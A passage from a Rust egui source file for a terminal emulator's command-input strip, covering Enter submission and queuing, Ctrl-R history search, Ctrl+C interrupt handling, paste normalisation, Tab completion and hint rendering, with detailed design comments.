                ui.ctx().request_repaint_after(d);
            }
        }
    }
    // Peek backdrop: the overlay floats OVER live grid rows — a bare label
    // would be illegible on top of htop's meters; wash the band with
    // translucent TERM_BG first (hover-only chrome, translucent per
    // doctrine; alpha rides the fade).
    if collapsed && reveal > 0.0 {
        painter.rect_filled(
            strip_rect,
            CornerRadius::ZERO,
            super::TERM_BG.gamma_multiply(0.88 * reveal),
        );
    }

    // ── Static-input architecture: the editor ALWAYS lives here in the
    // strip lane, rendered `❯ {cwd} {draft}` with the one caret; the grid
    // above is content-only (its latched prompt row is blanked by the
    // current-prompt cover — see cover_line_for). Fixed right-cluster slot
    // geometry, IDENTICAL in every mode (stable chrome, F3): elements may
    // dim, never move or unmount — submitting `ls` changes zero strip pixels
    // except the caret/text.
    let kbd_rect = Rect::from_center_size(
        Pos2::new(strip_rect.max.x - 22.0, strip_rect.center().y),
        Vec2::splat(22.0),
    );
    // Dead lane: the slot carries `↻ Restore  ⏎` (verb + silent keyboard
    // accelerator) — wider than every other occupant. Widened only on the
    // death edge (a real lifecycle change, not per-submit chrome motion);
    // the right edge stays fixed.
    let run_w = if dead_lane { 96.0 } else { 58.0 };
    let run_rect = Rect::from_center_size(
        Pos2::new(strip_rect.max.x - 44.0 - run_w / 2.0, strip_rect.center().y),
        Vec2::new(run_w, 24.0),
    );
    let hist_rect = Rect::from_center_size(
        Pos2::new(run_rect.min.x - 16.0, strip_rect.center().y),
        Vec2::splat(22.0),
    );
    // Bug C: no click-outside exemption rect while collapsed (the popup
    // can't open under alt anyway — the toggle is `!inputs.alt`; during a
    // peek the icon is a painted ghost, not a control).
    out.history_btn = (!collapsed).then_some(hist_rect);
    // The right-aligned text slot left of History: the Compose hints and the
    // Raw ❯ Compose affordance share it (one slot, never two occupants).
    let slot_right = hist_rect.min.x - 8.0;
    let lane_x = strip_rect.min.x + 14.0;
    let lane_rect = Rect::from_min_max(
        Pos2::new(lane_x, strip_rect.min.y),
        Pos2::new(slot_right, strip_rect.max.y),
    );
    // Fix b: the Dead lane's SECOND verb — `Retry ▸` for ssh terminals,
    // right-aligned in the fixed text slot the Compose hints use (one slot,
    // never two occupants: the dead lane presents no Compose affordance).
    // Rect computed here so the click hit-test below and the cluster paint
    // agree pixel-for-pixel.
    let retry_rect = (dead_lane && state.is_ssh).then(|| {
        let g = painter.layout_no_wrap(
            "Retry \u{25b8}".to_string(),
            FontId::proportional(12.0),
            super::ACCENT,
        );
        Rect::from_min_size(
            Pos2::new(slot_right - g.size().x, strip_rect.center().y - g.size().y / 2.0),
            g.size(),
        )
    });

    let has_draft = !state.draft.trim().is_empty();
    // The post-submit typeahead buffer is engaged: keys keep landing in the
    // editor; Enter QUEUES (one command per prompt cycle) instead of
    // submitting into an unresolved prompt.
    let buffering = state.buffering();
    // P6b §6: cmd executes one line per prompt — a multi-line draft can
    // neither submit nor queue on a Cmd terminal (the strip hint says why);
    // Enter keeps buffering it visibly in the TextEdit (the fusion guard's
    // InsertNewline path). The user splits or edits it back to one line.
    // D2: heuristic episodes share the constraint (the synthetic-block
    // ledger records one command per submission — N lines would be a lie).
    let cmd_multiline = (state.is_cmd || heur_episode) && state.draft.contains('\n');
    // Submission gating: an external submit / spoofed exec disables Enter
    // until the next prompt (inv. 4 — the editor never loses focus over it),
    // and the typeahead window holds Enter until its resolution.
    let can_submit = inputs.running
        && !inputs.alt
        && !inputs.open_block
        && inputs.at_prompt
        && !buffering
        && !cmd_multiline;
    // PERMANENT EDITOR: the busy span under a held Compose — an open block,
    // or the feed-time exec→pre span (`busy_since`) that covers the Blocks
    // round-trip. Enter QUEUES here (dispatched by `pump_pending` at the
    // next provably-clean prompt — never into the running command) and the
    // hint slot carries the busy chip.
    let busy_hold = inputs.running
        && !inputs.alt
        && !inputs.at_prompt
        && (inputs.open_block || state.busy_since.is_some());

    // PRE-SHELL veto (v0.1.1): no hook event has been seen in the CURRENT
    // lifetime and no prompt latch is live — whatever is talking (ssh auth,
    // a login chain) is not the shell. `arm_available` MUST be false here:
    // never offer `❯ Compose` over a password prompt, and the cold-attach
    // heuristic must not apply either (its current-epoch check already fails
    // after the epoch bump; the veto makes it explicit).
    let pre_shell_now = pre_shell(
        inputs.running,
        inputs.alt,
        backend.block_feed.as_ref().map(|f| f.pre_seen).unwrap_or(0),
        backend.block_feed.as_ref().map(|f| f.exec_seen).unwrap_or(0),
        state.at_prompt_latched(),
    );

    // Manual-activation availability: the gate core passes AND either a live
    // prompt latch or the cold-attach heuristic (§2.2 — a closed record from
    // the CURRENT epoch proves this spawn reached an interactive prompt; the
    // restored-claude wrapper only has old-epoch records and stays raw).
    let core_passes = inputs.running && !inputs.alt && !inputs.mouse && !inputs.open_block;
    let cold_ok = !recs.is_empty()
        && recs.iter().all(|r| r.end_off.is_some())
        && recs.last().is_some_and(|r| r.epoch == epoch);
    let arm_available = core_passes && !pre_shell_now && (inputs.at_prompt || cold_ok);

    // C2: while collapsed the band's pixels belong to the GRID — registering
    // a widget over them would steal hover from the terminal response and
    // clicks/wheel from the app (term_view gates its input pump on
    // `response.hovered()`). Peek detection uses `pointer_latest_pos` alone;
    // the interact keeps its stable Id on an empty rect so egui state never
    // churns across collapse edges.
    let strip_resp = ui.interact(
        if collapsed { Rect::NOTHING } else { strip_rect },
        Id::new(("composer_strip", terminal_id)),
        if collapsed { Sense::hover() } else { Sense::click() },
    );
    let hover_pos = ui.ctx().pointer_latest_pos();
    let over_kbd = hover_pos.is_some_and(|p| kbd_rect.contains(p));
    let over_run = hover_pos.is_some_and(|p| run_rect.contains(p));
    let over_hist = hover_pos.is_some_and(|p| hist_rect.contains(p));
    let row_h = ui.fonts_mut(|f| f.row_height(&font)).max(8.0);

    match state.mode {
        ComposerMode::Compose => {
            let ed_id = Id::new(("composer", terminal_id));

            // ── Ctrl-R history search (Tier-2b #1): keys FIRST, before the
            // caret-placement block below (so accept/cancel land their
            // caret_to_end this same frame) and before every other
            // consume-before-show chain (Esc here must never reach the
            // Tab-restore or blur paths). The overlay is pre-submit UI over
            // `state.draft` only. While the composer is NOT armed (Raw
            // mode / grid focus) this block does not exist, so Ctrl-R still
            // reaches the grid and ships ^R to the shell exactly as before.
            // Key handling acts on the results the user SAW (this frame's
            // pre-edit query); the render block after the TextEdit
            // recomputes so the painted rows are never stale.
            if !overlay_open {
                if state.search_active() {
                    let hits = search_results(recs, &state.draft, SEARCH_MAX);
                    // Ctrl-R again: cycle to the next match (readline
                    // parity), wrapping. Key repeat delivers several.
                    let cyc = ui
                        .input_mut(|i| i.count_and_consume_key(Modifiers::COMMAND, Key::R));
                    for _ in 0..cyc {
                        state.search_cycle(hits.len());
                    }
                    // Up/Down: walk the list (up = older/worse, clamped).
                    let up = ui
                        .input_mut(|i| i.count_and_consume_key(Modifiers::NONE, Key::ArrowUp))
                        as i64;
                    let down = ui.input_mut(|i| {
                        i.count_and_consume_key(Modifiers::NONE, Key::ArrowDown)
                    }) as i64;
                    if up != down {
                        state.search_nav(up - down, hits.len());
                    }
                    // Enter: the selection becomes the draft — close, do
                    // NOT submit (the whole point: edit before running).
                    // Every repeat is consumed so none falls into the
                    // TextEdit as a stray newline; with no matches Enter
                    // closes like Esc (nothing to insert).
                    let mut enters = 0u32;
                    while ui.input_mut(|i| i.consume_key(Modifiers::NONE, Key::Enter)) {
                        enters += 1;
                    }
                    if enters > 0 {
                        let sel = state.search.as_ref().map(|s| s.sel).unwrap_or(0);
                        match hits.get(sel) {
                            Some(h) => state.search_accept(&h.cmd),
                            None => state.search_cancel(),
                        }
                    } else if ui.input_mut(|i| i.consume_key(Modifiers::NONE, Key::Escape))
                    {
                        // Esc: close and restore the pre-search draft
                        // exactly (the stash contract). Consumed here, so
                        // the ordinary Esc chain (blur to grid) needs a
                        // second press — same one-Esc-per-layer rule as the
                        // Tab cycle's restore.
                        state.search_cancel();
                    }
                } else if state.has_focus
                    && ui.input_mut(|i| i.consume_key(Modifiers::COMMAND, Key::R))
                {
                    state.search_begin();
                }
            }

            // One-frame caret placement (P4): a reclaim/insert just replaced
            // the draft — put the caret at its end BEFORE the TextEdit shows
            // (the standard egui TextEditState pattern) so typing continues
            // where the landed text stopped.
            if state.caret_to_end {
                state.caret_to_end = false;
                let end = egui::text::CCursor::new(state.draft.chars().count());
                let mut st = egui::text_edit::TextEditState::load(ui.ctx(), ed_id)
                    .unwrap_or_default();
                st.cursor
                    .set_char_range(Some(egui::text::CCursorRange::one(end)));
                st.store(ui.ctx(), ed_id);
            }

            // Ctrl+C precedence while armed (Bug 4): a non-empty GRID
            // selection wins — copy it and consume the Copy event so the
            // TextEdit doesn't clobber the clipboard with its own (usually
            // empty) selection; the draft is untouched. With no grid
            // selection the event flows to the editor's native copy — UNLESS
            // nothing is copyable and the shell is NOT at a prompt: then the
            // user means INTERRUPT the running command (submit → hang →
            // Ctrl+C is the universal cancel; with the composer holding focus
            // through the post-submit window, the grid's interrupt path can
            // no longer see the chord). The win32 ^C ships, queued blind
            // submissions abort (nothing may fire after a cancel), the
            // visible draft is kept. Must run BEFORE the TextEdit is shown.
            if ui.input(|i| i.events.iter().any(|e| matches!(e, egui::Event::Copy))) {
                if let Some(text) = backend.selection_text().filter(|t| !t.is_empty()) {
                    ui.ctx().copy_text(text);
                    ui.input_mut(|i| i.events.retain(|e| !matches!(e, egui::Event::Copy)));
                } else {
                    let editor_sel = egui::text_edit::TextEditState::load(ui.ctx(), ed_id)
                        .and_then(|s| s.cursor.char_range())
                        .is_some_and(|r| r.primary != r.secondary);
                    // D2: a live heuristic latch counts as "at a prompt" —
                    // the interrupt chord must NEVER fire at a prompt we
                    // only detected heuristically (honest degradation: no
                    // ^C at an uncertain prompt). With the latch down the
                    // inner command is genuinely running and the deliberate
                    // Ctrl+C interrupt stays the universal cancel.
                    // Tier-2b: never while the search overlay is open —
                    // Ctrl+C there is the query box's own copy, and an
                    // accidental interrupt from inside a search would be
                    // the worst possible surprise.
                    if !editor_sel
                        && state.at_prompt_since.is_none()
                        && !heur_armed
                        && inputs.running
                        && !state.search_active()
                    {
                        ui.input_mut(|i| {
                            i.events.retain(|e| !matches!(e, egui::Event::Copy))
                        });
                        state.pending.clear();
                        state.post_submit = None;
                        state.last_activity = Some(now);
                        out.write = clear_chord(backend);
                        if trace_enabled() {
                            log::info!(
                                "[composer] Ctrl+C while busy → interrupt (buffer aborted)"
                            );
                        }
                    }
                }
            }

            // Normalize pasted text BEFORE the TextEdit sees it (Bug E):
            // Windows clipboard text arrives verbatim (CRLF + trailing
            // newline survive the arboard→winit→egui chain, and multiline
            // TextEdit inserts pastes unmodified), so a copied line's
            // trailing \r\n used to flip the lane editor into the upward
            // multi-line popup — the "floating band above the strip"
            // artifact. Rewrite the Paste event in place: same
            // consume-before-show pattern as Copy above, gated like Tab on
            // !overlay_open (an overlay's own text field keeps native
            // paste). Genuinely multi-line pastes keep their interior
            // newlines and still open the popup.
            if !overlay_open {
                ui.input_mut(|i| {
                    for e in &mut i.events {
                        if let egui::Event::Paste(t) = e {
                            *t = normalize_paste_text(t);
                        }
                    }
                });
            }

            // Consume keys BEFORE showing the TextEdit (standard egui
            // pattern): plain Enter submits (Shift+Enter passes through as a
            // newline); Arrow Up/Down recall history only at the draft's
            // vertical edges.
            // Enter at a live prompt — a NON-empty draft runs the command;
            // an EMPTY draft sends a bare `\r`, the user's "more lines"
            // spacing gesture (submit() marks the row a blank spacer so it
            // renders as whitespace, not a stacked raw prompt). The Run ▸
            // button, by contrast, stays gated on a non-empty draft (the
            // gesture is Enter, not a visible button press).
            //
            // FUSION GUARD (repro bonus defect): Enter while `can_submit` is
            // false used to be consumed and silently DROPPED while typing
            // kept extending the draft — the next successful Enter submitted
            // the fused backlog as one command (staging executed `lsechols`).
            // Now the un-armable Enter is NOT consumed: the TextEdit inserts
            // a line break at the caret, the draft visibly holds both
            // commands as separate lines, and submission encodes each line
            // as its own `\r` — two commands can never fuse. An EMPTY draft's
            // un-armable Enter is still swallowed (nothing to separate; a
            // newline would just grow the editor).
            let mut submit_now = false;
            // While an overlay (history popup / search / panel) is open, the
            // popup owns Enter/arrows — consuming them here on the stale
            // has_focus of the open frame would race the popup's own
            // consume-before-show (P4 §3.6 focus chain). The Ctrl-R overlay
            // is the same rule in-module: its block above already consumed
            // Enter/arrows, and the draft is the QUERY right now — recall
            // walks and ghost-accept must not fire against it.
            if state.has_focus && !overlay_open && !state.search_active() {
                // Consume EVERY pending Enter press, not just one: a held
                // key delivers several repeats per frame, and any press left
                // unconsumed falls into the TextEdit as a stray newline
                // (scope #3 — the held-Enter flood).
                let consume_all_enters = |ui: &mut Ui| {
                    let mut n = 0u32;
                    while ui.input_mut(|i| i.consume_key(Modifiers::NONE, Key::Enter)) {
                        n += 1;
                    }
                    n
                };
                // Queue while the typeahead buffer is engaged OR across the
                // whole busy span (permanent editor): Enter during a running
                // command queues the draft as a blind submission that fires
                // at the prompt-byte — faster than any human could re-type.
                match enter_action(can_submit, has_draft, (buffering || busy_hold) && !cmd_multiline) {
                    EnterAction::Submit => {
                        let n = consume_all_enters(ui);
                        if n > 0 {
                            if has_draft {
                                // Repeats beyond the first collapse into ONE
                                // submission — the draft empties on submit,
                                // there is nothing further to run.
                                submit_now = true;
                            } else {
                                // Empty-Enter spacing gesture (scope #3):
                                // QUEUE, never yield. Compose keeps focus for
                                // the whole run — the first spacer used to
                                // yield raw, and every remaining key-repeat
                                // then fell through to the grid as raw Enter
                                // spam (prompt flood + lost arm + the
                                // blank-void screen).
                                for _ in 0..n {
                                    state.push_spacer();
                                }
                            }
                        }
                    }
                    // Post-submit typeahead: Enter queues the draft as a
                    // blind submission on its own prompt cycle (rapid
                    // `cmd1⏎cmd2⏎cmd3⏎` = three clean sequential blocks).
                    // A full queue falls back to the visible-buffering
                    // newline (leave Enter unconsumed for the TextEdit).
                    EnterAction::Queue => {
                        if state.pending_has_room() {
                            let n = consume_all_enters(ui);
                            if n > 0 {
                                if has_draft {
                                    state.queue_draft();
                                    for _ in 1..n {
                                        state.push_spacer();
                                    }
                                } else {
                                    for _ in 0..n {
                                        state.push_spacer();
                                    }
                                }
                            }
                        } else if !has_draft {
                            let _ = consume_all_enters(ui);
                        }
                    }
                    EnterAction::Swallow => {
                        let _ = consume_all_enters(ui);
                    }
                    // NOT consumed: the TextEdit inserts the line break at
                    // the caret (the fusion guard's visible buffering).
                    EnterAction::InsertNewline => {}
                }
                let (line, total) = caret_line(ui.ctx(), ed_id, &state.draft);
                if line == 0 && ui.input_mut(|i| i.consume_key(Modifiers::NONE, Key::ArrowUp)) {
                    state.recall_prev(recs);
                }
                if line + 1 == total
                    && ui.input_mut(|i| i.consume_key(Modifiers::NONE, Key::ArrowDown))
                {
                    state.recall_next(recs);
                }
                // History ghost accept (Tier-2a #2): Right-arrow with the
                // caret at the very END of the draft appends the ghosted
                // remainder (PSReadLine parity). Consumed BEFORE the
                // TextEdit shows, and ONLY when the ghost is actually
                // painted this frame — same suppression as the paint (Tab
                // cycle / recall stash active) — so a mid-draft Right stays
                // native caret movement and no binding is stolen: Right at
                // end-of-text is otherwise a TextEdit no-op. End is left
                // alone (it has row-end semantics under soft wrap).
                if !state.tab_active() && state.recall.is_none() {
                    if let Some(rest) =
                        history_ghost(recs, &state.draft, &state.fam, prompt_cwd)
                    {
                        if caret_byte_of(ui.ctx(), ed_id, &state.draft) == state.draft.len()
                            && ui.input_mut(|i| {
                                i.consume_key(Modifiers::NONE, Key::ArrowRight)
                            })
                        {
                            let caret = state.ghost_accept(&rest);
                            set_caret_chars(ui.ctx(), ed_id, caret);
                        }
                    }
                }
            }

            // ── Tab completion (task #24): consumed BEFORE the TextEdit
            // shows (the standard consume-before-show pattern) — the editor
            // runs lock_focus(true), which sets egui's event-filter tab bit,
            // and the multiline TextEdit then inserts a literal `\t` on any
            // Tab press it sees (the user-reported "3 spacing" bug). Tab
            // must NEVER put spaces/tabs in the draft in ANY state, so this
            // runs regardless of has_focus (in Compose mode the grid never
            // reads keys — mode-based exclusion — so nothing else wants
            // them). Shift+Tab is consumed FIRST: consume_key matches
            // modifiers LOGICALLY, so the NONE pattern would swallow the
            // shifted presses too. Esc mid-cycle restores the original
            // token and eats that one Esc — the ordinary Esc chain (blur
            // to grid) continues on the next press.
            if !overlay_open {
                let back =
                    ui.input_mut(|i| i.count_and_consume_key(Modifiers::SHIFT, Key::Tab)) as i64;
                let fwd =
                    ui.input_mut(|i| i.count_and_consume_key(Modifiers::NONE, Key::Tab)) as i64;
                if state.tab_active() && ui.input(|i| i.key_pressed(Key::Escape)) {
                    ui.input_mut(|i| i.consume_key(Modifiers::NONE, Key::Escape));
                    if let Some(caret) = state.tab_escape() {
                        set_caret_chars(ui.ctx(), ed_id, caret);
                    }
                } else if fwd != back {
                    let caret_byte = caret_byte_of(ui.ctx(), ed_id, &state.draft);
                    if let Some(caret) = state.tab_press(prompt_cwd, caret_byte, fwd - back) {
                        set_caret_chars(ui.ctx(), ed_id, caret);
                    }
                }
                // Belt: strip any Tab press that slipped the exact-modifier
                // counts (Ctrl+Tab and friends) — egui's multiline arm would
                // still insert `\t` for them.
                ui.input_mut(|i| {
                    i.events.retain(|e| {
                        !matches!(
                            e,
                            egui::Event::Key {
                                key: Key::Tab,
                                pressed: true,
                                ..
                            }
                        )
                    })
                });
            }

            // ── The static editor: `❯ {cwd} {draft}` in the lane, ALWAYS —
            // stationary furniture (the user's architecture call). The grid
            // above is content-only; its latched prompt row is blanked by
            // the current-prompt cover. Multi-line drafts grow UPWARD from
            // the strip as a Foreground overlay so the grid keeps its
            // geometry (D1); the lane prefix stays painted (F8: ❯ + cwd
            // never vanish when the draft grows a second line).
            //
            // D2 honesty garnish: in a heuristic episode the chip is
            // `# {cwd-or-blank}` — cwd parsed best-effort from the prompt
            // text itself (display only, never persisted), never the outer
            // shell's hook-fed cwd (which would be a stale claim about a
            // different shell). A parse miss shows the bare sigil.
            let heur_cwd = heur_armed
                .then(|| heur_prompt_cwd(&backend.cursor_row_text()))
                .flatten();
            let x = if heur_episode {
                paint_prompt_prefix_sigil(&painter, lane_rect, heur_cwd.as_deref(), &font, "#")
            } else {
                paint_prompt_prefix(&painter, lane_rect, prompt_cwd, &font)
            };
            if heur_episode {
                let chip = Rect::from_min_max(
                    Pos2::new(lane_rect.min.x, strip_rect.min.y),
                    Pos2::new(x.max(lane_rect.min.x + 16.0), strip_rect.max.y),
                );
                ui.interact(chip, Id::new(("heur_chip", terminal_id)), Sense::hover())
                    .on_hover_text(
                        "prompt detected without shell integration; exit codes unavailable",
                    );
            }
            // The cwd a heuristic submission's hold/history cover carries:
            // the parsed prompt cwd (or none) — the outer shell's cwd would
            // label inner commands with a different shell's directory.
            let sub_cwd = if heur_episode {
                heur_cwd.as_deref()
            } else {
                prompt_cwd
            };
            // Frozen ghost through the submit handoff (Bug 3, static-input):
            // while the SubmitHold lives and the next command hasn't been
            // typed yet, the lane keeps showing the just-submitted text — at
            // Enter effectively only the caret changes, and the text
            // "commits upward" into the grid's history cover on release.
            // The first keystroke of the NEXT command replaces it (the
            // typeahead buffer means typing continues here, not raw).
            let lane_ghost = state
                .submit_hold
                .as_ref()
                .filter(|_| state.draft.is_empty() && !state.search_active())
                .map(|h| h.ghost.lines().next().unwrap_or("").to_string());
            // Tier-2b: the lane is the QUERY field while the Ctrl-R overlay
            // is open — every prediction/hint surface over the draft stands
            // down (ghost text, frozen submit ghost, busy chip, Tab cycle).
            let searching = state.search_active();
            let n_lines = editor_rows(&state.draft);
            // Prompt syntax highlighting (Tier-2a #1): both TextEdits render
            // through this layouter — a token-level colorizer over the SAME
            // lexer Tab completion uses (highlight.rs). Presentation only:
            // the job matches egui's default layouter in every geometry knob
            // (font, wrap width, halign, keep_trailing_whitespace), so rows/
            // wraps/caret rects are identical to an uncolored draft. The
            // closure tokenizes the text it is HANDED (never a cached draft:
            // mid-frame edits re-layout before `state.draft` settles); one
            // O(len) pass per call, galley cache absorbs repeat jobs.
            let hl_fam = state.fam.clone();
            let hl_font = font.clone();
            // Tier-2b: while the lane holds the search QUERY, colorizing it
            // as a command would be a lie — plain TEXT, geometry-identical
            // (same simple-job shape as highlight.rs's empty branch).
            let hl_plain = searching;
            let mut hl_layouter =
                move |lui: &Ui, buf: &dyn egui::TextBuffer, wrap_width: f32| {
                    let job = if hl_plain {
                        let mut j = egui::text::LayoutJob::simple(
                            buf.as_str().to_owned(),
                            hl_font.clone(),
                            super::TEXT,
                            wrap_width,
                        );
                        j.keep_trailing_whitespace = true;
                        j
                    } else {
                        super::highlight::layout_job(&hl_fam, buf.as_str(), &hl_font, wrap_width)
                    };
                    lui.fonts_mut(|f| f.layout_job(job))
                };
            let resp = if n_lines > 1 {
                let h = (n_lines.min(EDITOR_MAX_ROWS) as f32) * row_h + 12.0;
                let h = h.min(grid_rect.height().max(row_h + 12.0));
                let pop = Rect::from_min_max(
                    Pos2::new(strip_rect.min.x + 8.0, strip_rect.min.y - h),
                    Pos2::new(strip_rect.max.x - 8.0, strip_rect.min.y),
                );
                egui::Area::new(Id::new(("composer_pop", terminal_id)))
                    .order(egui::Order::Foreground)
                    .fixed_pos(pop.min)
                    .show(ui.ctx(), |aui| {
                        // Depth by shadow + background, never by strokes.
                        egui::Frame::new()
                            .fill(super::TERM_BG)
                            .corner_radius(CornerRadius::same(8))
                            .shadow(egui::epaint::Shadow {
                                offset: [0, 6],
                                blur: 28,
                                spread: 0,
                                color: Color32::from_black_alpha(150),
                            })
                            .inner_margin(egui::Margin::symmetric(10, 6))
                            .show(aui, |aui| {
                                aui.set_width(pop.width() - 20.0);
                                egui::ScrollArea::vertical()
                                    .max_height(h - 12.0)
                                    .show(aui, |aui| {
                                        aui.add(
                                            egui::TextEdit::multiline(&mut state.draft)
                                                .id(ed_id)
                                                .font(font.clone())
                                                .layouter(&mut hl_layouter)
                                                .desired_rows(2)
                                                .desired_width(f32::INFINITY)
                                                .lock_focus(true)
                                                .frame(egui::Frame::NONE),
                                        )
                                    })
                                    .inner
                            })
                            .inner
                    })
                    .inner
            } else {
                let ed_rect = Rect::from_min_max(
                    Pos2::new(x, strip_rect.min.y + (STRIP_H - row_h) / 2.0 - 1.0),
                    Pos2::new(slot_right, strip_rect.max.y - 4.0),
                );
                let mut ed_ui = ui.new_child(
                    egui::UiBuilder::new()
                        .max_rect(ed_rect)
                        .layout(egui::Layout::top_down(egui::Align::Min)),
                );
                // `.show` (not `.add`): the rich output's galley anchors the
                // history ghost right after the draft's last glyph.
                let te = egui::TextEdit::multiline(&mut state.draft)
                    .id(ed_id)
                    .font(font.clone())
                    .layouter(&mut hl_layouter)
                    .hint_text(if searching {
                        "search history\u{2026}"
                    } else if lane_ghost.is_some() {
                        ""
                    } else {
                        "Type a command\u{2026}"
                    })
                    .desired_rows(1)
                    .desired_width(ed_rect.width())
                    .lock_focus(true)
                    .frame(egui::Frame::NONE)
                    .show(&mut ed_ui);
                if let Some(g) = &lane_ghost {
                    if !g.is_empty() {
                        let galley =
                            painter.layout_no_wrap(g.clone(), font.clone(), super::TEXT);
                        painter.galley(
                            Pos2::new(x, strip_rect.center().y - galley.size().y / 2.0),
                            galley,
                            super::TEXT,
                        );
                    }
                }
                // History ghost paint (Tier-2a #2): the dim remainder of the
                // most-recent prefix-matching command, drawn after the draft
                // text. Derived per frame (never stored) — typing past it,
                // editing, or a mismatch clears it naturally. Suppressed
                // while a Tab cycle or recall stash owns the draft (no
                // fighting existing UX) and clipped at the hint slot so it
                // never runs under the right-side chrome.
                // Tier-2b: hidden while the Ctrl-R overlay is open (the
                // draft is the query — predicting a command off it would
                // paint noise under the results).
                if state.has_focus
                    && !state.tab_active()
                    && state.recall.is_none()
                    && !searching
                {
                    if let Some(rest) =
                        history_ghost(recs, &state.draft, &state.fam, prompt_cwd)
                    {
                        let end = te.galley.pos_from_cursor(te.galley.end());
                        let pos = Pos2::new(
                            te.galley_pos.x + end.max.x,
                            te.galley_pos.y + end.min.y,
                        );
                        let g =
                            painter.layout_no_wrap(rest, font.clone(), super::TEXT_FAINT);
                        let clip = painter.clip_rect().intersect(Rect::from_min_max(
                            pos,
                            Pos2::new(slot_right, strip_rect.max.y),
                        ));
                        painter.with_clip_rect(clip).galley(pos, g, super::TEXT_FAINT);
                    }
                }
                te.response.response
            };

            // A user edit forks off any active recall (§6.2). While the
            // Ctrl-R overlay is open the edit is a QUERY edit instead: the
            // selection snaps back to the best match and the recall stash —
            // which may be holding a pre-search ArrowDown restore — is kept.
            if resp.changed() {
                if searching {
                    state.search_edited();
                } else {
                    state.recall = None;
                }
            }

            // Escape: the TextEdit surrenders focus natively; yield the
            // episode to the grid. Otherwise keep/regain focus while no
            // overlay (search/modal/panel) owns typing — this is what makes
            // "close search → typing returns to the composer" work (§12.11).
            // (The primary focus grab is the pre-term_view request in
            // terminal_card, which stops keys falling to the grid in the arm
            // frame; this is the belt.)
            let esc = ui.input(|i| i.key_pressed(Key::Escape));
            if resp.lost_focus() && esc {
                state.blur_to_grid();
            } else if !overlay_open && (state.want_focus || !resp.has_focus()) {
                // Held through submits too (typeahead buffering): the editor
                // keeps focus across the submit→re-arm window so the next
                // command's keys land here, never raw.
                resp.request_focus();
            }
            // Clear want_focus only once egui has CONFIRMED focus on the
            // editor — otherwise a frame where the grab didn't land (overlay,
            // repaint timing) would drop the intent and a key could fall to
            // the grid, killing the arm (Bug 1).
            if resp.has_focus() {
                state.want_focus = false;
            }

            if submit_now {
                // Focus is NOT surrendered: the post-submit typeahead
                // window keeps the editor live for the next command.
                let (bytes, spacer) = state.submit(backend, cover_line, sub_cwd);
                out.write = bytes;
                out.spacer_gesture = spacer;
            } else if out.write.is_empty() {
                // Paced blind-queue dispatch (typeahead + scope #3): one
                // queued submission (or bare-`\r` spacer) per completed
                // prompt round-trip, mode stays Compose, focus stays here —
                // the caller marks the spacer cover exactly like a
                // submit-time gesture.
                if let Some((bytes, spacer)) =
                    state.pump_pending(backend, cover_line, sub_cwd, now)
                {
                    out.write = bytes;
                    out.spacer_gesture = spacer;
                }
            }

            // Hint slot (right-aligned left of History) — painted only when
            // it cannot collide with the editor's text (the lane owns the
            // full width; the hint floats over its empty tail).
            // Stable chrome: transients younger than REVEAL show nothing —
            // an instant command's submit window must not flash "waiting
            // for prompt…" through the slot (F3); a genuinely busy shell
            // reveals it once the edge is stale.
            let quiet = state
                .last_activity
                .is_some_and(|t| now.duration_since(t) < REVEAL);
            // PERMANENT EDITOR: honest Busy moved into the fixed hint slot,
            // not died — while a command runs under the held Compose the
            // slot shows the pulsing dot + running cmd + elapsed and states
            // the contract ("Enter queues"). Same slot the hints use (one
            // occupant, F3 stable chrome, zero geometry change); REVEAL
            // hysteresis keeps instant commands from flashing it.
            let busy_chip = (busy_hold
                && !quiet
                && lane_ghost.is_none()
                && !cmd_multiline
                && !searching)
                .then(|| {
                    match recs.iter().rev().find(|r| r.end_off.is_none()) {
                        Some(r) => format!(
                            "{} \u{b7} {} \u{2014} Enter queues",
                            super::middle_ellipsize(&r.cmd.replace(['\r', '\n'], " "), 24),
                            super::term_view::fmt_duration(
                                now_ms().saturating_sub(r.started_ms)
                            ),
                        ),
                        // Blocks round-trip gap (exec edge seen, rec not
                        // mirrored yet): the contract line alone.
                        None => "running \u{2014} Enter queues".to_string(),
                    }
                });
            let hint = if searching {
                // The overlay's one line of guidance rides the EXISTING
                // hint slot — zero new chrome (F3 stable geometry).
                Some("Enter inserts \u{b7} Esc restores \u{b7} Ctrl+R next")
            } else if lane_ghost.is_some() || busy_chip.is_some() {
                None
            } else if cmd_multiline {
                // P6b §6 / D2: the refusal is announced, never silent.
                Some(if state.is_cmd {
                    "cmd runs one line at a time"
                } else {
                    "one line at a time in this shell"
                })
            } else if !can_submit {
                (!quiet).then_some("waiting for prompt\u{2026}")
            } else if state.has_focus && state.draft.is_empty() {
                Some("Shift+Enter \u{2014} new line")
            } else {
                None
            };
            if busy_chip.is_some() || hint.is_some() {
                let last = state.draft.lines().last().unwrap_or("");
                let tw = if last.is_empty() {
                    0.0
                } else {
                    painter
                        .layout_no_wrap(last.to_string(), font.clone(), super::TEXT)
                        .size()
                        .x
                };
                let text: &str = busy_chip.as_deref().or(hint).unwrap_or_default();
                let hg = painter.layout_no_wrap(
                    text.into(),
                    FontId::proportional(10.0),
                    super::TEXT_FAINT,
                );
                // The chip's dot needs its slice of the slot too.
                let dot = busy_chip.is_some();
                let extra = if dot { 13.0 } else { 0.0 };
                if x + tw + 24.0 < slot_right - hg.size().x - extra {
                    let tx = slot_right - hg.size().x;
                    if dot {
                        // Pulse + live elapsed: the same ~100ms cadence the
                        // Busy lane asks for (silent long-running commands
                        // produce no repaints of their own).
                        ui.ctx().request_repaint_after(Duration::from_millis(100));
                        let time = ui.input(|i| i.time);
                        let pulse =
                            0.6 + 0.4 * (time as f32 * std::f32::consts::TAU).sin().abs();
                        painter.circle_filled(
                            Pos2::new(tx - 10.0, strip_rect.center().y),
                            3.0,
                            super::ACCENT.gamma_multiply(pulse),
                        );
                    }
                    painter.galley(
                        Pos2::new(tx, strip_rect.center().y - hg.size().y / 2.0),
                        hg,
                        super::TEXT_FAINT,
                    );
                }
            }

            if strip_resp.clicked() {
                if let Some(p) = strip_resp.interact_pointer_pos() {
                    if kbd_rect.contains(p) {
                        state.blur_to_grid();
                        resp.surrender_focus();
                    } else if hist_rect.contains(p) {
                        // Opening the history panel closes the inline
                        // search (restore first — one history surface at a
                        // time; the panel must see the real draft).
                        state.search_cancel();
                        out.toggle_history = true;
                    } else if run_rect.contains(p) {
                        if state.search_active() {
                            // Run while searching can only mean "back out":
                            // the visible text is the QUERY — submitting it
                            // as a command would be the worst surprise.
                            // Close, restore, and let the user click again.
                            state.search_cancel();
